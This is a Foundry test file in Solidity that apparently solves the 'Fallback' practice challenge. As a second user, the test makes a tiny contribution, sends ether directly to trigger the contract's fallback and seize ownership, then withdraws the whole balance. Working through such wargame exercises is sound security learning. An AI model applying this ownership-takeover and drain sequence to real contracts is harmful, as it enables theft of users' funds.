// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fallbackContract;

    address userOne = makeAddr("user1");
    address userTwo = makeAddr("user2");

    function setUp() public {
        vm.prank(userOne);
        fallbackContract = new Fallback();
    }

    function test_changeOwnerAndDrainTheBalance() public {
        console.log(userOne);
        console.log(userTwo);
        vm.pauseGasMetering();

        vm.deal(userTwo, 10 ether);
        vm.prank(userTwo);
        fallbackContract.contribute{value: 0.0009 ether}();
        vm.prank(userTwo);
        bool sent = payable(address(fallbackContract)).send(1 ether);
        assertEq(fallbackContract.owner(), userTwo);

        vm.prank(userTwo);
        fallbackContract.withdraw();
        assertEq(address(fallbackContract).balance, 0);
    }
}
